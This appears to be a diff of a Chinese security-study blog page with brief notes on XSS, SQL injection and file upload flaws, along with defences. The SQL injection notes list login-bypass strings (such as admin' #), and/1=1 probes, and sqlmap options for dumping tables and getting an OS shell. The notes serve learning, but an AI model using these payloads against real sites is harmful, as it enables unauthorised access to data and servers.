+<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>跨站脚本攻击（Cross Site Scripting，XSS）是一种Web 安全漏洞。</p>
+<p>攻击者利用该漏洞，在网页中注入恶意代码，等待受害者访问被注入恶意代码的网页。</p>
+<p>网页中的恶意代码会浏览器识别，并执行。</p>
+<p>恶意代码通常是JavaScript 脚本，由于JS 的灵活性，导致XSS 攻击面特别大。</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>xss通过将精心构造的代码(Javascript)注入到网页中，并由浏览器解释运行这段JS代码，以达到恶意攻击的效果。当用户访问被XSS脚本注入过的网页，XSS脚本就会被提取出来，用户浏览器就会解析执行这段代码，这就是用户被攻击了。整个XSS攻击过程涉及三个角色：<br>服务器<br>攻击者<br>客户端浏览器用户(前端)</p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251114221107328.png" alt="image-20251114221107328"></p>
+<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>盗取各种用户账号；</p>
+<p>窃取用户Cookie 资料，冒充用户身份进入网站；</p>
+<p>劫持用户会话执行任意操作；</p>
+<p>刷流量，执行弹窗广告；</p>
+<p>传播蠕虫病毒；</p>
+<h2 id="漏洞评级"><a href="#漏洞评级" class="headerlink" title="漏洞评级"></a>漏洞评级</h2><p>高危</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>XSS 盲打网站后台管理员Cookie</p>
+<h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><h3 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h3><p>输入验证</p>
+<p>数据消毒</p>
+<h3 id="输出编码"><a href="#输出编码" class="headerlink" title="输出编码"></a>输出编码</h3><h2 id="漏洞案例"><a href="#漏洞案例" class="headerlink" title="漏洞案例"></a>漏洞案例</h2>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/11/15/Cross-Site-Scripting-XSS-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/" data-id="cuidsYE0v9EYqZ2C7yOsgkKgp" data-title="Cross Site Scripting XSS 跨站脚本攻击" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
 
-<script src="/js/search.js"></script>
 
-<script src="/js/hide-inline-interaction.js"></script>
 
-<script src="/js/hide-toggle-interaction.js"></script>
+  
+    <article id="post-SQL-injection-SQL注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/11/15/SQL-injection-SQL%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time class="dt-published" datetime="2025-11-15T12:58:06.000Z" itemprop="datePublished">2025-11-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/11/15/SQL-injection-SQL%E6%B3%A8%E5%85%A5/">SQL injection SQL注入</a>
+    </h1>
+  
 
-<script src="/js/dark-mode-sync.js"></script>
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>注入原理：通过用户可控参数注入SQL语法，破坏原有SQL结构。</p>
+<p>产生原因：</p>
+<p>1.程序员在处理程序和数据库交互时，使用字符串拼接的方式构造SQL语句</p>
+<p>2.未对用户可控参数进行足够的过滤，便将参数内容拼接到SQL语句中</p>
+<h2 id="万能账号密码"><a href="#万能账号密码" class="headerlink" title="万能账号密码"></a>万能账号密码</h2><p>数字型万能账号：</p>
+<p>&lt;a&gt; or &lt;true&gt; #  </p>
+<p>&lt;a&gt; or &lt;true&gt; – a</p>
+<p>单引号字符型万能账号：</p>
+<p>&lt;a&gt;’ or &lt;true&gt; #</p>
+<p>&lt;a&gt;’ or &lt;true&gt; – a</p>
+<p>双引号字符型万能账号:</p>
+<p>&lt;a&gt;” or &lt;true&gt; #</p>
+<p>&lt;a&gt;” or &lt;true&gt; – a</p>
+<p>数字型万能密码：</p>
+<p>admin #</p>
+<p>admin – a</p>
+<p>单引号字符型万能密码：</p>
+<p>admin’ #</p>
+<p>admin’ – a</p>
+<p>双引号字符型万能密码：</p>
+<p>admin” #</p>
+<p>admin” – a</p>
+<h2 id="基本类型"><a href="#基本类型" class="headerlink" title="基本类型"></a>基本类型</h2><h3 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h3><p>url地址中输入<a target="_blank" rel="noopener" href="http://www.xxxx.com/ccc.php?id=x">www.xxxx.com/ccc.php?id=x</a> and 1&#x3D;1<br>页面显示正常，继续下一步</p>
+<p>SQL语句类似于：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span>x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>；</span><br></pre></td></tr></table></figure>
 
-<script src="/js/animations.js"></script>
+<p>url地址中输入<a target="_blank" rel="noopener" href="http://www.xxxx.com/ccc.php?id=x">www.xxxx.com/ccc.php?id=x</a> and 1&#x3D;2<br>页面错误，这说明存在数字型注入</p>
+<p>SQL语句类似于：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span>x <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>;</span><br></pre></td></tr></table></figure>
 
-<script src="/js/ai-theme.js"></script>
 
-<script src="/js/loading-animation.js"></script>
-<script>window.theme = {
-  features: {"dark_mode":true,"smooth_scroll":true,"back_to_top":true,"loading_animation":true},
-  code_block: {"height_limit":200,"enable_folding":true,"max_height":"300px","show_lang":true},
-  ai_summary: {"enable":true,"api_key":"","summary_directly":false,"ai_name":"然-AI","ai_introduce":"我是文章辅助AI: 然-AI，一个基于deepseek的强大语言模型，有什么可以帮到您？😊","ai_version":"deepseekv3","buttons":["介绍自己","来点灵感","生成AI简介"]},
-  categories: {"layout":"accordion","accordion_animation":true,"show_empty_categories":true}
-};
-</script><script src="/js/ai.js"></script><script src="/js/postai.js"></script></body></html>
+
+<h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><p>url地址中输入<a target="_blank" rel="noopener" href="http://www.xxx.com/ccc.php?id=1%E2%80%99">www.xxx.com/ccc.php?id=1’</a> and ‘1’&#x3D;’1<br>页面正常，继续下一步</p>
+<p>SQL语句类似于：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>url地址中输入<a target="_blank" rel="noopener" href="http://www.xxx.com/ccc.php?id=1%E2%80%99">www.xxx.com/ccc.php?id=1’</a> and ‘1’&#x3D;’2<br>页面报错，则说明存在字符型注入</p>
+<p>SQL语句类似于：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="基本手法"><a href="#基本手法" class="headerlink" title="基本手法"></a>基本手法</h2><h4 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h4><p>适用于数据库中内容会回显到页面中的情况。利用union select语句，执行两条select语句，实现跨库，跨表查询</p>
+<p>必要条件：</p>
+<p>两条select语句查询结果具有相同的列数；</p>
+<p>对应的列数据类型相同</p>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><h4 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h4><h4 id="堆叠查询"><a href="#堆叠查询" class="headerlink" title="堆叠查询"></a>堆叠查询</h4><h2 id="sqlmap常用参数"><a href="#sqlmap常用参数" class="headerlink" title="sqlmap常用参数"></a>sqlmap常用参数</h2><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-u</td>
+<td>检测注入点</td>
+</tr>
+<tr>
+<td>-dbs</td>
+<td>列出所有的库名</td>
+</tr>
+<tr>
+<td>-current-user</td>
+<td>当前连接数据库用户</td>
+</tr>
+<tr>
+<td>-current-db</td>
+<td>当前数据库</td>
+</tr>
+<tr>
+<td>-D “cms”</td>
+<td>指定目标数据库</td>
+</tr>
+<tr>
+<td>-tables</td>
+<td>列出数据库中所有的表名</td>
+</tr>
+<tr>
+<td>-T “cms_users”</td>
+<td>指定目标表名为 cms_users</td>
+</tr>
+<tr>
+<td>-columns</td>
+<td>列出所有的字段名</td>
+</tr>
+<tr>
+<td>-c “username,password”</td>
+<td>指定目标字段</td>
+</tr>
+<tr>
+<td>–dump</td>
+<td>列出字段内容</td>
+</tr>
+<tr>
+<td>-r</td>
+<td>从文件中读取 HTTP 请求</td>
+</tr>
+<tr>
+<td>-os-shell</td>
+<td>在特定情况下，可以直接获得目标系统 Shell</td>
+</tr>
+<tr>
+<td>-level 3</td>
+<td>设置 sqlmap 检测等级为 3</td>
+</tr>
+<tr>
+<td>-cookie&#x3D;”username&#x3D;admin”</td>
+<td>携带 Cookie 信息进行注入</td>
+</tr>
+<tr>
+<td>-g</td>
+<td>利用 Google 搜索引擎自动搜索注入点</td>
+</tr>
+<tr>
+<td>–batch</td>
+<td>使用默认选项</td>
+</tr>
+<tr>
+<td>-random-agent</td>
+<td>使用随机 User-Agent 信息</td>
+</tr>
+<tr>
+<td>-v 3</td>
+<td>显示 payload</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th><strong>两大基本类型</strong></th>
+<th><strong>五大基本手法</strong></th>
+<th><strong>提交参数方式</strong></th>
+<th><strong>注入点位置</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>数字型  字符型</td>
+<td>联合查讯  报错注入  布尔盲注  延时注入  堆叠查询</td>
+<td>GET注入  POST注入  Cookie注入 HTTP头部注入</td>
+<td>URL注入  搜索框注入  留言板注入  登录框注入</td>
+</tr>
+</tbody></table>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/11/15/SQL-injection-SQL%E6%B3%A8%E5%85%A5/" data-id="cuidAPaFpa8TJxLFOV7WUBLOO" data-title="SQL injection SQL注入" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-File-Upload-任意文件上传" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/11/15/File-Upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
+  <time class="dt-published" datetime="2025-11-15T12:43:20.000Z" itemprop="datePublished">2025-11-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/11/15/File-Upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">File Upload 任意文件上传</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><table>
+<thead>
+<tr>
+<th>Windows</th>
+<th>Linux</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>cmd  PowerShell</td>
+<td>bash  sh  zsh</td>
+</tr>
+</tbody></table>
+<h2 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h2><p>WebShell 是一个网站的后门,也是一个命令解释器。通过web 方式,使用HTTP&#x2F;HTTPS 协议传递命令消息到服务器,并且继承了web 用户</p>
+<p>的权限,在服务器上远程执行命令。WebShell 从本质上讲,就是服务器端可运行的脚本文件,后缀名通常为:</p>
+<p>.php</p>
+<p>.asp</p>
+<p>.aspx</p>
+<p>.jsp</p>
+<p>WebShell 接收来自于Web 用户的命令,然后在服务器端执行,也称为网站木马、木马后门、网马等。</p>
+<table>
+<thead>
+<tr>
+<th>Web 容器</th>
+<th>支持的脚本语言</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Apache HTTPD</td>
+<td>PHP</td>
+</tr>
+<tr>
+<td>IIS</td>
+<td>ASP、ASPX、PHP</td>
+</tr>
+<tr>
+<td>Tomcat</td>
+<td>JSP、JSPX</td>
+</tr>
+</tbody></table>
+<h3 id="大马"><a href="#大马" class="headerlink" title="大马"></a>大马</h3><p>代码量较大</p>
+<h3 id="小马"><a href="#小马" class="headerlink" title="小马"></a>小马</h3><p>一句话木马，需要与蚁剑连接</p>
+<p>特点：短小精悍，功能强大</p>
+<p>三大基本功能：文件管理，虚拟终端，数据库管理</p>
+<h1 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h1><h2 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h2><p>Web 应用开放了文件上传功能。</p>
+<p>用户可以利用文件上传功能向服务器上传文件。</p>
+<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>攻击者可以利用文件上传功能，上传恶意文件，对服务器造成危害</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Web 开放了文件上传功能。</p>
+<p>对文件上传功能没有做限制或限制不足。</p>
+<p>任意文件上传。</p>
+<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><ul>
+<li>获取WebShell。</li>
+<li>任意文件读取。</li>
+<li>任意命令执行。</li>
+<li>控制网站。</li>
+<li>控制服务器。</li>
+</ul>
+<h2 id="漏洞评级"><a href="#漏洞评级" class="headerlink" title="漏洞评级"></a>漏洞评级</h2><p>高危</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>文件上传漏洞完美利用,受到以下条件限制:</p>
+<p>· Web 服务器开启文件上传功能,Web 用户可以使用该功能。</p>
+<p>· Web 用户({www|www-data|apache})对目标目录具有可写权限,甚至具有执行权限。一般情况下,Web 目录都有执行权限。<br>· 完美利用意味着文件可以执行,也就是说代码可以被服务器解析。<br>· 服务器开启了PUT 方法。</p>
+<h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>代码角度：</p>
+<ul>
+<li>采用白名单策略，严格限制上传文件的后缀名；</li>
+<li>上传文件重命名，尽量少的从客户端获取信息，包括文件名、文件类型、文件内容等；</li>
+<li>文件内容检测；</li>
+<li>进行二次渲染，过滤掉图片马中的恶意代码；</li>
+<li>避免文件包含漏洞；</li>
+<li>严格处理文件路径，防御00 截断漏洞；</li>
+<li>检测Token 值，防止数据包重放。</li>
+</ul>
+<p>业务角度：</p>
+<p>强口令策略，避免恶意攻击者登录网站后台；</p>
+<p>尽量避免Web 用户修改上传白名单。</p>
+<p>Web 容器角度：</p>
+<ul>
+<li>及时更新Web 容器，防止<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=227391870&content_type=Article&match_order=1&q=%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E&zhida_source=entity">解析漏洞</a>产生。</li>
+<li>禁用Web 容器PUT 方法。</li>
+</ul>
+<p>系统角度：</p>
+<ul>
+<li>避开空格、点<code>.</code>、<code>::$DATA</code> 等windows 系统特性。</li>
+</ul>
+<p>服务器部署：</p>
+<ul>
+<li>严格控制权限，<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=227391870&content_type=Article&match_order=1&q=%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90&zhida_source=entity">执行权限</a>与写权限分离。</li>
+<li>建立单独的文件存储服务器，类似于<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=227391870&content_type=Article&match_order=1&q=%E7%AB%99%E5%BA%93%E5%88%86%E7%A6%BB&zhida_source=entity">站库分离</a>。</li>
+</ul>
+<h2 id="漏洞案例"><a href="#漏洞案例" class="headerlink" title="漏洞案例"></a>漏洞案例</h2>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/11/15/File-Upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" data-id="cuid3xbOA_5tUrUv0BLaHpVm7" data-title="File Upload 任意文件上传" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">十一月 2025</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/11/15/File-Include-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">File Include 任意文件包含</a>
+          </li>
+        
+          <li>
+            <a href="/2025/11/15/Cross-Site-Scripting-XSS-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/">Cross Site Scripting XSS 跨站脚本攻击</a>
+          </li>
+        
+          <li>
+            <a href="/2025/11/15/SQL-injection-SQL%E6%B3%A8%E5%85%A5/">SQL injection SQL注入</a>
+          </li>
+        
+          <li>
+            <a href="/2025/11/15/File-Upload-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">File Upload 任意文件上传</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 白尾青芳<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
